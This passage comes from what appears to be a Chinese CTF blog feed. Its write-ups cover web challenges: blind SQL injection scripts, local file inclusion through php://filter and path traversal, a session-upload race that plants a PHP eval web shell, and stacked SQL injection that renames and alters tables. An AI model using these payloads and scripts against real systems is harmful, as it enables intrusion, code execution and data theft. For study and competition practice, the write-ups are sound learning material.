class="token number">205</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Filter<span class="token operator">%</span><span class="token number">206</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>ColorSpace<span class="token operator">%</span><span class="token number">207</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>Length<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token constant">20R</span><span class="token operator">/</span>BitsPerComponent<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span>0Astream<span class="token operator">%</span><span class="token constant">0A</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">D8</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">24SHA</span><span class="token number">-1</span><span class="token operator">%</span>20is<span class="token operator">%</span>20dead<span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">85</span><span class="token operator">/</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span>239u<span class="token operator">%</span><span class="token constant">9C9</span><span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token constant">C6</span><span class="token operator">%</span><span class="token constant">3CL</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token constant">E1</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span>01sF<span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span>91f<span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token constant">7E</span><span class="token operator">%</span><span class="token number">11</span><span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token constant">9A</span><span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token constant">B2V</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span>CAg<span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">C7</span><span class="token operator">%</span><span class="token constant">F8</span><span class="token operator">%</span><span class="token constant">5B</span><span class="token operator">%</span>A8Ly<span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token constant">0C</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span><span class="token constant">E2</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>F8m<span class="token operator">%</span><span class="token constant">B3</span><span class="token operator">%</span><span class="token constant">A9</span><span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span><span class="token number">01</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token constant">DFE</span><span class="token operator">%</span><span class="token constant">C1O</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token constant">B3</span><span class="token operator">%</span><span class="token constant">DC8</span><span class="token operator">%</span>E9j<span class="token operator">%</span><span class="token constant">C2</span><span class="token operator">/</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span>BDr<span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token constant">0EE</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">E0F</span><span class="token operator">%</span><span class="token constant">D2</span><span class="token operator">%</span><span class="token constant">3CW</span><span class="token operator">%</span><span class="token constant">0F</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">%</span><span class="token number">14</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">BBU</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">F5</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">2B</span><span class="token operator">%</span><span class="token constant">E31</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">807</span><span class="token operator">%</span><span class="token constant">B8</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">1F</span><span class="token operator">%</span><span class="token number">0E3</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">AC5</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">EBM</span><span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">C1</span><span class="token operator">%</span>A8dy<span class="token operator">%</span>0Cx<span class="token operator">%</span>2Cv<span class="token operator">%</span><span class="token constant">21V</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token constant">DD0</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span>D0k<span class="token operator">%</span><span class="token constant">D0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">3F</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token constant">BCF</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">B1</span></code></pre><h3 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h3><p>本题中对单引号进行了禁用，利用转义使用后面password的单引号进行闭合，</p><p>空格使用/**/替代，使用or，left，right，ord避开ascii和substr函数的禁用</p><p><img src="../../../../medias/img//clip_image032.jpg" alt="img"></p><p>构建python脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://202.119.201.197:13004/index.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> f<span class="token string">"or/**/ord(right(left((select/**/password/**/from/**/users/**/limit/**/9,1),{i}),1))={j}#"</span>    <span class="token comment" spellcheck="true">#ord(right(left(database(),1),1))>0#</span>    <span class="token comment" spellcheck="true">#select username from security.users limit 0,1</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"1\\"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Login success!"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">for</span> z <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        low <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true">#32</span>        high <span class="token operator">=</span> <span class="token number">127</span><span class="token comment" spellcheck="true">#127</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> exp<span class="token punctuation">(</span>x<span class="token punctuation">,</span> i<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>最终得到flag</p><p><img src="../../../../medias/img//clip_image038.jpg" alt="img"></p><h3 id="简单的文件包含？"><a href="#简单的文件包含？" class="headerlink" title="简单的文件包含？"></a>简单的文件包含？</h3><p><img src="../../../../medias/img//image-20200925201023539.png" alt="image-20200925201023539"></p><p>使用client-ip构造127.0.0.1绕过</p><p>拿到源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_REAL_IP'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Do u think that I dont know X-Forwarded-For?&lt;br>Too young too simple sometimes naive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Sorry, this site is only optimized for those who comes from localhost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>简单的文件包含，但是之前已经包含了flag.php，<code>include_once</code>只能包含一次，所以要饶过他</p><p><a href="https://www.anquanke.com/post/id/213235#h3-5" target="_blank" rel="noopener">分析链接</a></p><p><img src="../../../../medias/img//image-20200925201523855.png" alt="image-20200925201523855"></p><p>payload:</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//202.119.201.197:13002/</span><span class="token constant">POST</span><span class="token punctuation">:</span>f<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=/x/../proc/self/cwd/flag.php</span></code></pre><p>base64解码即可</p><h3 id="Try-GET-file"><a href="#Try-GET-file" class="headerlink" title="Try:GET_file"></a>Try:GET_file</h3><p>包含session</p><p>参考：<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener"></a></p><blockquote><p>如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p><p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session  ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。  并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。    </p><p>利用条件竞争进行rce</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'TGAO'</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"system('cat /tmp/7IDUrqGOt8PMATm852/flag.txt');"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#data = {"cmd":"system('find / -name flag*');"}</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span> <span class="token string">'http://202.119.201.197:13077/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'tgao.txt'</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://202.119.201.197:13077/?file=/tmp/sess_'</span><span class="token operator">+</span>sessid<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'tgao.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"retry"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    event<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒2020七月月赛</title>
      <link href="/2020/08/02/an-heng-2020-qi-yue-yue-sai/"/>
      <url>/2020/08/02/an-heng-2020-qi-yue-yue-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezfileinclude"><a href="#Ezfileinclude" class="headerlink" title="Ezfileinclude"></a>Ezfileinclude</h2><p><a href="http://183.129.189.60:10012/image.php?t=1596551067&amp;f=Z3F5LmpwZw==" target="_blank" rel="noopener">http://183.129.189.60:10012/image.php?t=1596551067&amp;f=Z3F5LmpwZw==</a></p><p>点开后发现是png的图片二进制，<code>Z3F5LmpwZw==</code>base64解码为gqy.jpg，可见为文件包含，分析得</p><p>t参数为时间戳（如果不知道参数的含义也没关系，直接正则匹配获取即可），会根据时间正确与否判断是否包含</p><p>脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#res=requests.get("http://183.129.189.60:10009/index.php")</span><span class="token comment" spellcheck="true">#p=re.findall(r"t=(.+?)&amp;f",res.text)  也可正则匹配实时获取时间戳</span>order<span class="token operator">=</span><span class="token string">"/gqy.jpg"</span>order<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>order<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">"http://183.129.189.60:10012/image.php?t="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;f="</span><span class="token operator">+</span>orderres<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>发现返回的内容与之前一致，说明拼接了目录。</p><p>将order=”../../../../../../etc/passwd”，返回<code>You are not allowed to do that.</code>，说明有waf。</p><p>waf过滤了../，导致了目录穿越不可用，也就无法读到其他源码和flag</p><p>后面看wp才发现这waf写的真奇葩，只验证前个字符，那只要将前几个随便写就行</p><p>order=”abcd/../../../../../../flag”，得flag: <code>flag{847d2f93276a21f084c44f4d74c61ef4}</code></p><p>读取源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"you miss some parameters"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$timestamp</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token variable">$timestamp</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"what's your time?"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"/../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"/../"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"../"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"./"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"/."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"/."</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>"<span class="token comment" spellcheck="true">//")) === "//") {</span>        <span class="token keyword">echo</span> <span class="token string">'You are not allowed to do that.'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/img/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p><img src="../../../../medias/img/image-20200804224730946.png" alt="image-20200804224730946"></p><p>一直试不出来，先占坑</p><p>（无列名注入+<code>sys.x$schema_flattened_keys</code>来绕过<code>information_schema</code>）</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj刷题记录</title>
      <link href="/2020/07/20/buuoj-shua-ti-ji-lu/"/>
      <url>/2020/07/20/buuoj-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>记录buuoj写过的题</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>F12看到存在source.php，跳转后看到代码</p><pre class=" language-php+HTML"><code class="language-php+HTML"> <?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&$page)        {            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])        && is_string($_REQUEST['file'])        && emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";    }  ?></code></pre><p>可以看到考点为文件包含，传入的file参数先会检查是否在白名单中，第二个是检查传入的字符串中‘?’前的字符串是否在白名单中，第三个是先进行url解码再截取，其实可以直接第二个就构造payload得到flag</p><blockquote><p>Payload:</p><p><a href="http://f5c2ee8f-ee5f-4469-bad8-86c15a958352.node3.buuoj.cn/source.php?file=hint.php?/../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://f5c2ee8f-ee5f-4469-bad8-86c15a958352.node3.buuoj.cn/source.php?file=hint.php?/../../../../../ffffllllaaaagggg</a></p></blockquote><p><img src="../../../../img/image-20200723140717985.png" alt="image-20200723140717985"></p><p>截取通过后，include会将hint.php?/ 作为目录，然后不断前转目录，到根目录包含ffffllllaaaagggg<br>也有的情况?后会被解析为get提交的参数，此时可将’?’进行二次url编码。</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>（sqlmap仅能跑出库名，表名为空）</p><p>先使用 1’ or 1=1–+ 发现存在注入</p><p><img src="../../../../img/image-20200723140943242.png" alt="image-20200723140943242"></p><p>加’后报错，然后order by猜出字段为2，union select 1,2 后返回：<br>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);<br>发现过滤了常用词。</p><p>使用堆叠注入：</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>1’;show tables;–+ //查看表名</p><p><img src="../../../../img/image-20200723141207481.png" alt="image-20200723141207481"></p><p>  ?inject=1’;show columns from `1919810931114514`;–+</p><p>  ?inject=1’;show columns from `words`;–+</p><p>（要在表名加``否则无回显）</p><p>MySQL中反引号和单引号的区别与用法:</p><blockquote><ol><li><p>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</p></li><li><p>引号用来标注语句中所引用的字符型常量或时间型常量，即<strong>字段值</strong></p></li><li><p>例如：select * from `username` where `name`=”name”</p></li></ol></blockquote><p><img src="../../../../img/image-20200723141506549.png" alt="image-20200723141506549"></p><p><img src="../../../../img/image-20200723141516510.png" alt="image-20200723141516510"></p><p>可以看到flag在1919810931114514中</p><p><strong>方法一</strong></p><p>因为语句被过滤严重，但并为过滤改名语句，所以思路是借助本身查询语句，也就是将1919810931114514改名为words，将flag改为id</p><p>/?inject=1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag<code> </code>id` VARCHAR(100);–+</p><p>(搜寻中看到有可能修改失败，所以有另一语句：/?inject=1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from 